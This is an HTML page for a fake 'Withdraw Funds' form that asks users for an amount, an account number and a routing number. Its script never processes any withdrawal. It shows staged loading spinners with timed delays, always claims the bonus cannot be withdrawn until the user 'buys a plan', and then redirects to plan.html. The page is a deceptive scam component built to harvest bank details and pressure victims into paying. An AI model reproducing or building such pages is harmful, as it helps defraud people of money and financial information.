<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Withdraw Amount</title>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 20px;
    background: #fff;
    color: #111;
  }
  h2 {
    text-align: center;
    color: #0b274d;
    margin-bottom: 20px;
  }
  .form {
    max-width: 400px;
    margin: auto;
    background: #f8faff;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 4px 10px rgba(0,0,0,0.08);
  }
  label {
    display: block;
    margin-bottom: 6px;
    font-weight: 600;
    color: #0b274d;
  }
  input {
    width: 100%;
    padding: 12px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 8px;
    font-size: 15px;
  }
  button {
    width: 100%;
    padding: 12px;
    border: none;
    background: #0b274d;
    color: #fff;
    font-size: 16px;
    border-radius: 8px;
    cursor: pointer;
    transition: 0.2s;
  }
  button:hover {
    background: #133b73;
  }
  .message {
    margin-top: 15px;
    padding: 12px;
    border-radius: 8px;
    text-align: center;
    font-weight: 500;
    display: none;
  }
  .error {
    background: #ffe6e6;
    color: #cc0000;
  }

  /* Loading Overlay */
  .overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(11, 39, 77, 0.7);
    display: none;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    z-index: 9999;
  }
  .spinner {
    width: 50px;
    height: 50px;
    border: 4px solid rgba(255, 255, 255, 0.3);
    border-top: 4px solid orange;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 15px;
  }
  .loading-text {
    font-size: 16px;
    color: #fff;
  }
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
</style>
</head>
<body>

<h2>Withdraw Funds</h2>
<div class="form">
  <label for="amount">Enter Amount ($)</label>
  <input type="number" id="amount" placeholder="Enter amount" />

  <label for="account">Account Number</label>
  <input type="text" id="account" placeholder="Enter account number" />

  <label for="routing">Routing Number</label>
  <input type="text" id="routing" placeholder="Enter routing number" />

  <button id="withdrawBtn">Withdraw</button>

  <div id="message" class="message error">
    Can’t withdraw bonus amount. Kindly buy a plan to withdraw your bonus.
  </div>
</div>

<!-- Loading Overlay -->
<div class="overlay" id="loadingOverlay">
  <div class="spinner"></div>
  <div class="loading-text">Processing withdrawal...</div>
</div>

<script>
  const overlay = document.getElementById("loadingOverlay");
  const message = document.getElementById("message");

  document.getElementById("withdrawBtn").addEventListener("click", function() {
    const amount = document.getElementById("amount").value.trim();
    const account = document.getElementById("account").value.trim();
    const routing = document.getElementById("routing").value.trim();

    if (!amount || !account || !routing) {
      message.innerText = "Please fill in all fields.";
      message.style.display = "block";
      return;
    }

    // Initial 5-second delay before first loading
    setTimeout(() => {
      overlay.style.display = "flex";

      // First loading period (2 seconds)
      setTimeout(() => {
        overlay.style.display = "none";
        message.innerText = "Can’t withdraw bonus amount. Kindly buy a plan to withdraw your bonus.";
        message.style.display = "block";

        // Wait 1 second to show the error message, then show loading again
        setTimeout(() => {
          message.style.display = "none"; // hide error temporarily
          overlay.style.display = "flex"; // show loading again

          // Second loading period (2 seconds)
          setTimeout(() => {
            overlay.style.display = "none";
            // Redirect to plan.html
            window.location.href = "plan.html";
          }, 2000);

        }, 1000); // wait 1 second after error message

      }, 2000); // first loading duration

    }, 5000); // initial delay before first loading
  });
</script>

</body>
</html>
